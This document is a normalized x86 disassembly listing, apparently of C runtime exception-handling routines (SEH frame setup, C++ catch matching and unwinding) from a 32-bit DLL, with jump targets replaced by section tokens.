call sub_10008d64
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001643d
add esp 0x20
pop esi
pop ebp
retn
sub_100154ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_100155a5
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1000bc4d
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_100155a5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10008d64
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001643d
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_100154ce
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10015411
pop ebx
leave
retn
sub_10015644
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_100129fc
call sub_100129fc
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_100156b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1000bc4d
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1000bc4d
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_100156e3
mov edi edi
push ebp
mov ebp esp
call sub_1000bc4d
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1001570a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000bc4d
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1000bc4d
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1000bc4d
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_100129fc
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1001575c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1001549b
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10016530
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_100157bc
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100157f2
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10015856
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10009900
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10009140
pop ecx
sub_1001587d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1000f0d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_100158dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1000bc4d
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1000bc4d
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1000bc4d
and [ eax + 0x90 ] 0x0
jmp sub_100129b0
sub_1001592b
push 0x10
push r--data
call sub_1000f940
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100159ed
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1000bc4d
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1000f985
retn
call sub_100129fc
call sub_100129fc
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_10016530
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10015a07
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1000bc4d
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_10015a4c
push 0x8
push r--data
call sub_1000f940
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1000f985
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1001540a
mov [ ebp - 0x4 ] 0xfffffffe
sub_10015aa1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_10015aca
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_100129fc
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_1001587d
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_10015b89
push 0x2c
push r--data
call sub_1000f940
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_100156b7
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1000bc4d
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1000bc4d
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1000bc4d
mov [ eax + 0x88 ] esi
call sub_1000bc4d
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1001575c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10015caf
mov eax [ ebp - 0x1c ]
call sub_1000f985
retn
sub_10015c22
mov esp [ ebp - 0x18 ]
call sub_1000bc4d
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001592b
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10015caf
mov eax [ ebp - 0x1c ]
call sub_1000f985
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_10015caf
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1001570a
pop ecx
call sub_1000bc4d
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1000bc4d
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_100156e3
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10015a4c
pop ecx
pop ecx
sub_10015d25
push 0xc
push r--data
call sub_1000f940
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100129fc
push ebx
push esi
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001657c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_100092b0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1001657c
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_10015aa1
pop ecx
pop ecx
push eax
push esi
call sub_100092b0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1000f985
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_10015aa1
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_10015ea4
push 0x8
push r--data
call sub_1000f940
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10015aa1
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001540a
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_10015d25
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f985
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10015aa1
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001540a
jmp r-xdata
sub_10015f36
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10015ea4
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_100153d8
call sub_10015411
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001592b
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_10015b89
add esp 0x28
test eax eax
je r-xdata
sub_10015fa4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1000bc4d
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1000bc4d
lea edi [ eax + 0x80 ]
call sub_1000ba9d
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10015644
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_100129fc
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100154ce
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10015f36
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_100160ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_100129fc
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1000bc4d
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_100129fc
call sub_100129b0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10015fa4
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1000bc4d
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1000bc4d
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1000bc4d
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1001657c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10015644
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_100129fc
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_10015a4c
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1000bc4d
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1000bc4d
mov edi [ eax + 0x94 ]
call sub_1000bc4d
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_10015aca
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_10015aca
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10009b3e
test al al
jne r-xdata
call sub_100129fc
cmp eax 0x19930522
jne r-xdata
call sub_1000bc4d
call sub_1000bc4d
call sub_1000bc4d
mov [ eax + 0x88 ] esi
call sub_1000bc4d
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1001587d
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10015a4c
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_100098a4
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10009ea4
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_10015f36
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_10015411
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001592b
add esp 0x10
push [ esi + 0x1c ]
call sub_10015b40
sub_1001643d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1000bc4d
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
